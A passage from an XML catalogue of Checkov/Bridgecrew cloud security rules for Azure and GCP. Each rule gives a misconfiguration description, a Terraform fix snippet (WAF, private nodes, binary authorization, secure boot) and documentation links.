      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-key-vault-enables-soft-delete' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_121</key>
    <name>Ensure Azure front door has WAF enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-front-door-does-not-have-waf-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-front-door-does-not-have-waf-enabled"></div>Azure front door does not have WAF enabled</div><a aria-label="Skip link to Azure front door does not have WAF enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-front-door-does-not-have-waf-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_frontdoor</li>
<li><strong>Argument:</strong> web_application_firewall_policy_link_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_frontdoor" "example" {
              ...
+             web_application_firewall_policy_link_id = "this_is_id"
              ...
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-front-door-enables-waf' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-front-door-enables-waf</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-front-door-enables-waf' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_122</key>
    <name>Ensure application gateway uses WAF in Detection or Prevention modes</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="application-gateway-does-not-use-waf-in-detection-or-prevention-modes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-application-gateway-does-not-use-waf-in-detection-or-prevention-modes"></div>Application gateway does not use WAF in Detection or Prevention modes</div><a aria-label="Skip link to Application gateway does not use WAF in Detection or Prevention modes" class="heading-anchor-icon fa fa-anchor" href="#application-gateway-does-not-use-waf-in-detection-or-prevention-modes"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_web_application_firewall_policy</li>
<li><strong>Argument:</strong> policy_settings.enabled +  policy_settings.mode</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_web_application_firewall_policy" "example" {
                                            ...
                      policy_settings {
+                       mode                        = "Prevention"
                        request_body_check          = true
                        file_upload_limit_in_mb     = 100
                        max_request_body_size_in_kb = 128
                    }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-application-gateway-uses-waf-in-detection-or-prevention-modes' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-application-gateway-uses-waf-in-detection-or-prevention-modes</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-application-gateway-uses-waf-in-detection-or-prevention-modes' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_123</key>
    <name>Ensure Azure front door uses WAF in Detection or Prevention modes</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-front-door-does-not-use-waf-in-detection-or-prevention-modes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-front-door-does-not-use-waf-in-detection-or-prevention-modes"></div>Azure front door does not use WAF in Detection or Prevention modes</div><a aria-label="Skip link to Azure front door does not use WAF in Detection or Prevention modes" class="heading-anchor-icon fa fa-anchor" href="#azure-front-door-does-not-use-waf-in-detection-or-prevention-modes"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_frontdoor_firewall_policy</li>
<li><strong>Argument:</strong> policy_settings.enabled + policy_settings.mode</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_frontdoor_firewall_policy" "example" {

                                            ...
                      policy_settings {
 +                      enabled                     = true
 +                      mode                        = "Prevention"
                        request_body_check          = true
                        file_upload_limit_in_mb     = 100
                        max_request_body_size_in_kb = 128
                      }
                      ...
                    }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-front-door-uses-waf-in-detection-or-prevention-modes' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-front-door-uses-waf-in-detection-or-prevention-modes</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-front-door-uses-waf-in-detection-or-prevention-modes' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_124</key>
    <name>Ensure Azure Cognitive Search disables public network access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-cognitive-search-does-not-disable-public-network-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-cognitive-search-does-not-disable-public-network-access"></div>Azure Cognitive Search does not disable public network access</div><a aria-label="Skip link to Azure Cognitive Search does not disable public network access" class="heading-anchor-icon fa fa-anchor" href="#azure-cognitive-search-does-not-disable-public-network-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>It is more secure for Azure backend services to be accessed through Private Link rather than public internet access.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_search_service</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_search_service" "example" {
              ...
 +            public_network_access_enabled = false
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-cognitive-search-disables-public-network-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-cognitive-search-disables-public-network-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-cognitive-search-disables-public-network-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_61</key>
    <name>Enable VPC flow logs and intranode visibility</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="vpc-flow-logs-and-intranode-visibility-are-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-vpc-flow-logs-and-intranode-visibility-are-disabled"></div>VPC flow logs and intranode visibility are disabled</div><a aria-label="Skip link to VPC flow logs and intranode visibility are disabled" class="heading-anchor-icon fa fa-anchor" href="#vpc-flow-logs-and-intranode-visibility-are-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable VPC Flow Logs and Intranode Visibility to see pod-level traffic, even for traffic within a worker node. With this feature, you can use VPC Flow Logs or other VPC features for intranode traffic.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_container_cluster</li>
<li><strong>Argument:</strong> enable_intranode_visibility</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_container_cluster" "example" {
  name               = var.name
  location           = var.location
  project            = data.google_project.project.name
+ enable_intranode_visibility = true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/enable-vpc-flow-logs-and-intranode-visibility' target='_blank'> https://docs.bridgecrew.io/docs/enable-vpc-flow-logs-and-intranode-visibility</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/enable-vpc-flow-logs-and-intranode-visibility' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_64</key>
    <name>Ensure GCP Kubernetes Engine Clusters are configured with private nodes feature</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kubernetes-engine-clusters-not-configured-with-private-nodes-feature"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kubernetes-engine-clusters-not-configured-with-private-nodes-feature"></div>GCP Kubernetes Engine Clusters not configured with private nodes feature </div><a aria-label="Skip link to GCP Kubernetes Engine Clusters not configured with private nodes feature " class="heading-anchor-icon fa fa-anchor" href="#gcp-kubernetes-engine-clusters-not-configured-with-private-nodes-feature"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Disable public IP addresses for cluster nodes, so that they only have private IP addresses. Private Nodes are nodes with no public IP addresses.<br/>
Disabling public IP addresses on cluster nodes restricts access to only internal networks, forcing attackers to obtain local network access before attempting to compromise the underlying Kubernetes hosts.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_container_cluster</li>
<li><strong>Argument:</strong> private_cluster_config</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_container_cluster" "example" {
  name               = var.name
  location           = var.location
  project            = data.google_project.project.name

+ private_cluster_config {
+   enable_private_nodes    = var.private_cluster_config["enable_private_nodes"]
+   enable_private_endpoint = var.private_cluster_config["enable_private_endpoint"]
+   master_ipv4_cidr_block  = var.private_cluster_config["master_ipv4_cidr_block"]
+ }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-clusters-are-created-with-private-nodes' target='_blank'> https://docs.bridgecrew.io/docs/ensure-clusters-are-created-with-private-nodes</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-clusters-are-created-with-private-nodes' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_65</key>
    <name>Ensure Kubernetes RBAC users are managed with Google Groups for GKE</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes-rbac-users-are-not-managed-with-google-groups-for-gke"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes-rbac-users-are-not-managed-with-google-groups-for-gke"></div>Kubernetes RBAC users are not managed with Google Groups for GKE</div><a aria-label="Skip link to Kubernetes RBAC users are not managed with Google Groups for GKE" class="heading-anchor-icon fa fa-anchor" href="#kubernetes-rbac-users-are-not-managed-with-google-groups-for-gke"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cluster Administrators should leverage G Suite Groups and Cloud IAM to assign Kubernetes user roles to a collection of users, instead of to individual emails using only Cloud IAM.</p>
<p>On- and off-boarding users is often difficult to automate and prone to error. Using a single source of truth for user permissions via G Suite Groups reduces the number of locations that an individual must be off-boarded from, and prevents users gaining unique permissions sets that increase the cost of audit.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_container_cluster</li>
<li><strong>Argument:</strong> authenticator_groups_config.security_group</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_container_cluster" "example" {
  name               = var.name
  location           = var.location
  project            = data.google_project.project.name
  
+ authenticator_groups_config{
+   security_group="<a class="__cf_email__" data-cfemail="0d6a6668207e686e787f647974206a7f62787d7e4d7462787f6962606c6463236e6260" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
+ }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/manage-kubernetes-rbac-users-with-google-groups-for-gke' target='_blank'> https://docs.bridgecrew.io/docs/manage-kubernetes-rbac-users-with-google-groups-for-gke</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/manage-kubernetes-rbac-users-with-google-groups-for-gke' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_66</key>
    <name>Ensure binary authorization is used</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="binary-authorization-is-not-used"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-binary-authorization-is-not-used"></div>Binary authorization is not used</div><a aria-label="Skip link to Binary authorization is not used" class="heading-anchor-icon fa fa-anchor" href="#binary-authorization-is-not-used"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Binary Authorization helps to protect supply-chain security by only allowing images with verifiable cryptographically signed metadata into the cluster.</p>
<p>Binary Authorization provides software supply-chain security for images that you deploy to GKE from Google Container Registry (GCR) or another container image registry.</p>
<p>Binary Authorization requires images to be signed by trusted authorities during the development process. These signatures are then validated at deployment time. By enforcing validation, you can gain tighter control over your container environment by ensuring only verified images are integrated into the build-and-release process.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_container_cluster</li>
<li><strong>Argument:</strong> enable_binary_authorization</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_container_cluster" "success" {
  name               = var.name
  location           = var.location
  initial_node_count = 1
  project            = data.google_project.project.name
+ enable_binary_authorization = true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-use-of-binary-authorization' target='_blank'> https://docs.bridgecrew.io/docs/ensure-use-of-binary-authorization</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-use-of-binary-authorization' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_67</key>
    <name>Ensure GCP Kubernetes engine clusters have legacy compute engine metadata endpoints disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kubernetes-engine-clusters-have-legacy-compute-engine-metadata-endpoints-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kubernetes-engine-clusters-have-legacy-compute-engine-metadata-endpoints-enabled"></div>GCP Kubernetes engine clusters have legacy compute engine metadata endpoints enabled</div><a aria-label="Skip link to GCP Kubernetes engine clusters have legacy compute engine metadata endpoints enabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-kubernetes-engine-clusters-have-legacy-compute-engine-metadata-endpoints-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Disable the legacy GCE instance metadata APIs for GKE nodes. Under some circumstances, these can be used from within a pod to extract the node's credentials.<br/>
The legacy GCE metadata endpoint allows simple HTTP requests to be made returning sensitive information. To prevent the enumeration of metadata endpoints and data exfiltration, the legacy metadata endpoint must be disabled.<br/>
Without requiring a custom HTTP header when accessing the legacy GCE metadata endpoint, a flaw in an application that allows an attacker to trick the code into retrieving the contents of an attacker-specified web URL could provide a simple method for enumeration and potential credential exfiltration. By requiring a custom HTTP header, the attacker needs to exploit an application flaw that allows them to control the URL and also add custom headers in order to carry out this attack successfully.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_container_cluster</li>
<li><strong>Argument:</strong> min_master_version</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_container_cluster" "example" {
  name               = var.name
  location           = var.location
  initial_node_count = 1
  project            = data.google_project.project.name

+ min_master_version = 1.12 // (or higher)
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-legacy-compute-engine-instance-metadata-apis-are-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-legacy-compute-engine-instance-metadata-apis-are-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-legacy-compute-engine-instance-metadata-apis-are-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_68</key>
    <name>Ensure secure boot for shielded GKE nodes is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="secure-boot-for-shielded-gke-nodes-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-secure-boot-for-shielded-gke-nodes-is-disabled"></div>Secure boot for shielded GKE nodes is disabled</div><a aria-label="Skip link to Secure boot for shielded GKE nodes is disabled" class="heading-anchor-icon fa fa-anchor" href="#secure-boot-for-shielded-gke-nodes-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable Secure Boot for Shielded GKE Nodes to verify the digital signature of node boot components.<br/>
An attacker may seek to alter boot components to persist malware or root kits during system initialization. Secure Boot helps ensure that the system only runs authentic software by verifying the digital signature of all boot components, and halting the boot process if signature verification fails.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_container_cluster / google_container_node_pool</li>
<li><strong>Argument:</strong> node_config.shielded_instance_config.enable_secure_boot</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_container_cluster" "success" {
  name               = var.name
  
  ...
  node_config {
    workload_metadata_config {
      node_metadata = "GKE_METADATA_SERVER"
    }
    shielded_instance_config {
-     enable_secure_boot = false
    }
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-secure-boot-for-shielded-gke-nodes-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-secure-boot-for-shielded-gke-nodes-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-secure-boot-for-shielded-gke-nodes-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_71</key>
    <name>Ensure shielded GKE nodes are enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="shielded-gke-nodes-are-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-shielded-gke-nodes-are-not-enabled"></div>Shielded GKE nodes are not enabled</div><a aria-label="Skip link to Shielded GKE nodes are not enabled" class="heading-anchor-icon fa fa-anchor" href="#shielded-gke-nodes-are-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Shielded GKE Nodes provides verifiable integrity via secure boot, virtual trusted platform module (vTPM)-enabled measured boot, and integrity monitoring.</p>
<p>Shielded GKE nodes protects clusters against boot- or kernel-level malware or rootkits which persist beyond infected OS.</p>
<p>Shielded GKE nodes run firmware which is signed and verified using Google's Certificate Authority, ensuring that the nodes' firmware is unmodified and establishing the root of trust for Secure Boot. GKE node identity is strongly protected via virtual Trusted Platform Module (vTPM) and verified remotely by the master node before the node joins the cluster. Lastly, GKE node integrity (i.e., boot sequence and kernel) is measured and can be monitored and verified remotely.</p>
